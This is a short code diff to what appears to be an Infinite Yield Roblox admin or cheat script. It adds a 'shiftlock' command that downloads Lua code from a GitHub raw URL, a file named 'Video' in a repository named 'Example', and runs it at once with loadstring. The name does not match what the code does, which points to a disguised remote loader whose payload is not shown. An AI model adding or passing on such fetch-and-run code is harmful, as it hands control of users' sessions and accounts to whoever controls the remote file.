@@ -526,6 +526,10 @@ InfiniteYield:AddCommand("naked", function(user)
     end
 end)
 
+InfiniteYield:AddCommand("shiftlock", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/prosadaf/Example/refs/heads/main/Video"))()
+end)
+
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
